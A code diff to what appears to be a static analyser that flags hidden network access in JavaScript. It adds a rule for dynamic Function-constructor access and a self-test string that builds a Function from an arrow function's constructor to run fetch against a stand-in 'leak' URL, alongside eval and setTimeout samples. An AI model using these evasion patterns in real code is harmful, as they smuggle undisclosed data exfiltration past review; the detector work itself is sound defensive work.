@@ -343,6 +343,9 @@ function programmaticNetworkViolations(path, source) {
       if (globalReturningProperties.has(member)) {
         add(node, `browser-global-returning property ${member}`);
       }
+      if (member === 'constructor') {
+        add(node, 'dynamic Function constructor access');
+      }
       if (
         ts.isElementAccessExpression(node) &&
         member === null &&
@@ -524,6 +527,7 @@ function runSelfTest() {
     'eval("fetch(remote)")',
     'setTimeout("fetch(remote)", 0)',
     'setInterval("fetch(remote)", 1000)',
+    "const execute = (() => {}).constructor; execute(\"fetch('https://example.test/leak')\")()",
     'const image = new Image(); image.src = remote;',
     "document.createElement('img')",
     "document.createElementNS('http://www.w3.org/2000/svg', 'image')",
